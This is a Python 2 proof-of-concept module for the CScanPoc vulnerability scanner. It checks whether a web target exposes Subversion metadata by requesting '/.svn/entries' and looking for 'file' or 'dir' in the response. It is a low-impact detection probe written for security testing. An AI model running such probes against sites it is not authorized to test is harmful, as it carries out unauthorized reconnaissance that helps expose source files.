# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'SVN_0101' # 平台漏洞编号，留空
    name = 'SVN信息泄漏' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2014-09-24'  # 漏洞公布时间
    desc = '''
    use svn incorrect cause site information disclosure.
    ''' # 漏洞描述
    ref = 'Unknown', # 漏洞来源http://drops.wooyun.org/tips/352
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' # cve编号
    product = 'SVN'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8c26726b-d8a7-4d00-b331-5973fa16690d' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            keyword = ['file','dir']
            vul_url = self.target + '/.svn/entries'
            vul_urresquest = urllib2.Request(vul_url)
            response = urllib2.urlopen(vul_urresquest)
            if response.getcode() != 200:
                return
            content = response.read()
            flag = False
            for word in keyword:
                if word in content:
                    flag = True
                    break
            if flag == True:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()